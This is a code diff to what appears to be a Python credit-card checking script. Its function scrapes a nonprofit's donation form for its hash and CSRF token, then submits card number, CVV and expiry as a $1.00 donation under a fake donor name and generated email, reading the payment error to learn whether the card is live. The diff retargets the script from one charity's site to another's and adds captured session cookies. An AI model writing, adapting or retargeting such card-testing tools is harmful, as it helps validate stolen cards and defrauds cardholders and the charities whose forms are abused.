@@ -22,7 +22,7 @@ def Tele(ccx):
 	random_amount2 = random.randint(1, 99)
 	
 	cookies = {
-	    'PHPSESSID': '6ebd9a6bd65cc9dd0dc78d6274',
+	    'PHPSESSID': '7c9eb95bcd8fb1bd7682f56dff',
 	}
 	
 	headers = {
@@ -30,7 +30,7 @@ def Tele(ccx):
 	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'Cache-Control': 'max-age=0',
 	    'Connection': 'keep-alive',
-	    # 'Cookie': 'PHPSESSID=6ebd9a6bd65cc9dd0dc78d6274',
+	    # 'Cookie': 'PHPSESSID=7c9eb95bcd8fb1bd7682f56dff; _ga=GA1.1.2160436.1753100909; _fbp=fb.1.1753100910668.509455476701004337; _gcl_au=1.1.404533445.1753100913; _hjSessionUser_1646622=eyJpZCI6IjU5MjA1ZTJkLTAwNWYtNTcyNS05MzIzLTU5YWFhYzhiNmM4ZCIsImNyZWF0ZWQiOjE3NTMxMDk3NDg4MzgsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_1646622=eyJpZCI6IjA0ZDg4NTUwLTkwZjEtNDg1Ny05YjVjLWE0NzQ5YWExNjgxMCIsImMiOjE3NTMxMDk3NDg4NTAsInMiOjEsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; rl_visitor_history=740a8e5e-ea68-416f-b94c-a21c10f934f0; sifi_user_id=undefined; _hjSessionUser_2482818=eyJpZCI6IjQyYzhjYzA4LWJkYTktNTAzMC05MzE3LTY0NjhhNzNiZjI1YyIsImNyZWF0ZWQiOjE3NTMxMDA5MTA1NTEsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_2482818=eyJpZCI6ImU0NzA3MzAwLThmY2QtNDk4Zi1iMzQwLWVkNGIxNjQ1NDE5ZSIsImMiOjE3NTMxMDk4NjczMjksInMiOjEsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; _ga_HTZWWTN32G=GS2.1.s1753109748$o2$g1$t1753109989$j60$l0$h0; _uetsid=37305b20662e11f0859881782dfd9c7a; _uetvid=3731bc50662e11f0aef5c113987fb0d6',
 	    'Referer': 'https://www.google.com/',
 	    'Sec-Fetch-Dest': 'document',
 	    'Sec-Fetch-Mode': 'navigate',
@@ -43,13 +43,13 @@ def Tele(ccx):
 	    'sec-ch-ua-platform': '"Android"',
 	}
 	
-	response = session.get('https://www.uniony.org/forms/support-opportunities/', cookies=cookies, headers=headers)
+	response = session.get('https://www.nojcc.org/forms/donation/', cookies=cookies, headers=headers)
 	
 	hash = re.search(r'name="hash" value="(.*?)"', response.text).group(1)
 	tok = re.search(r'name="csrfToken" value="(.*?)"', response.text).group(1)
 	
 	cookies = {
-	    'PHPSESSID': '6ebd9a6bd65cc9dd0dc78d6274',
+	    'PHPSESSID': '7c9eb95bcd8fb1bd7682f56dff',
 	}
 	
 	headers = {
@@ -58,9 +58,9 @@ def Tele(ccx):
 	    'Cache-Control': 'max-age=0',
 	    'Connection': 'keep-alive',
 	    'Content-Type': 'application/x-www-form-urlencoded',
-	    # 'Cookie': 'PHPSESSID=6ebd9a6bd65cc9dd0dc78d6274',
-	    'Origin': 'https://www.uniony.org',
-	    'Referer': 'https://www.uniony.org/forms/support-opportunities/',
+	    # 'Cookie': 'PHPSESSID=7c9eb95bcd8fb1bd7682f56dff; _ga=GA1.1.2160436.1753100909; _fbp=fb.1.1753100910668.509455476701004337; _gcl_au=1.1.404533445.1753100913; _hjSessionUser_1646622=eyJpZCI6IjU5MjA1ZTJkLTAwNWYtNTcyNS05MzIzLTU5YWFhYzhiNmM4ZCIsImNyZWF0ZWQiOjE3NTMxMDk3NDg4MzgsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_1646622=eyJpZCI6IjA0ZDg4NTUwLTkwZjEtNDg1Ny05YjVjLWE0NzQ5YWExNjgxMCIsImMiOjE3NTMxMDk3NDg4NTAsInMiOjEsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; rl_visitor_history=740a8e5e-ea68-416f-b94c-a21c10f934f0; sifi_user_id=undefined; _uetsid=37305b20662e11f0859881782dfd9c7a; _uetvid=3731bc50662e11f0aef5c113987fb0d6; _hjSessionUser_2482818=eyJpZCI6IjQyYzhjYzA4LWJkYTktNTAzMC05MzE3LTY0NjhhNzNiZjI1YyIsImNyZWF0ZWQiOjE3NTMxMDA5MTA1NTEsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_2482818=eyJpZCI6ImU0NzA3MzAwLThmY2QtNDk4Zi1iMzQwLWVkNGIxNjQ1NDE5ZSIsImMiOjE3NTMxMDk4NjczMjksInMiOjEsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; _ga_HTZWWTN32G=GS2.1.s1753109748$o2$g1$t1753109923$j60$l0$h0',
+	    'Origin': 'https://www.nojcc.org',
+	    'Referer': 'https://www.nojcc.org/index.php?formProcessed=DonationPayment',
 	    'Sec-Fetch-Dest': 'document',
 	    'Sec-Fetch-Mode': 'navigate',
 	    'Sec-Fetch-Site': 'same-origin',
@@ -73,16 +73,27 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    'formProcessed': 'Donation',
+	    'formProcessed': 'DonationPayment',
 	}
 	
 	data = {
-	    'formField_donation_amount': 'Other',
-	    'formField_other_amount': '',
-	    'formPayment_method': 'Credit Card',
-	    'formField_Designation': 'General Operations',
-	    'formPayment_owner': 'Rodam User',
+	    'formField_Title': '- Please select -',
+	    'formField_First_Name': 'Rodam',
+	    'formField_Last_Name': 'User',
+	    'formField_Email': f'genpaypal{random_amount1}{random_amount2}@gmail.com',
+	    'formField_Address_Ack': 'Street 27',
+	    'formField_Address2_Ack': '',
+	    'formField_City_Ack': 'New York',
+	    'formField_State_Ack': 'New York',
+	    'formField_Zip_Ack': '10014',
+	    'formField_Address': 'Street 27',
+	    'formField_Address2': '',
+	    'formField_City': 'New York',
+	    'formField_State': 'New York',
+	    'formField_Zip': '10014',
+	    'formPayment_total_payment': '1.00',
 	    'formPayment_card': f'{card_type}',
+	    'formPayment_owner': 'Rodam User',
 	    'formPayment_number': f'{n}',
 	    'formPayment_cvv': f'{cvc}',
 	    'formMeta_formPayment_expiration': 'expiration',
@@ -90,25 +101,27 @@ def Tele(ccx):
 	        f'{mm}',
 	        f'20{yy}',
 	    ],
-	    'formPayment_total_payment': '1',
 	    'formPayment_gateway': '',
-	    'formField_Email': f'genpaypal{random_amount1}{random_amount2}@gmail.com',
+	    'formPayment_method': 'Credit Card',
+	    'formField_FundChoice': '-- Select a fund --',
+	    'formField_InHonorOf': '',
 	    'hash': f'{hash}',
 	    'csrfToken': f'{tok}',
 	    'edit_id': '0',
 	    'module': '',
 	    'src': 'forms',
 	    'srctype': 'process',
-	    'id': 'Donation',
-	    'fs_id': 'Donation',
-	    'submenu': 'MakeDonation',
+	    'id': 'DonationPayment',
+	    'fs_id': 'DonationPayment',
+	    'submenu': 'donate',
+	    'submit': 'Submit Donation',
 	}
 	
-	response = session.post('https://www.uniony.org/index.php', params=params, cookies=cookies, headers=headers, data=data)
+	response = session.post('https://www.nojcc.org/index.php', params=params, cookies=cookies, headers=headers, data=data)
 	
 	try:
 		result = re.search(r'<b>Payment error:<\/b> (.*?)<\/div>', response.text).group(1)
 	except:
-		result = re.search(r'times, serif;">(.*?)&nbsp', response.text).group(1)
+		result = re.search(r'style="color: gray; font-size: 12pt; font-family: Palatino Linotype;">(.*?)<\/span><\/p>', response.text).group(1)
 		
 	return (result)
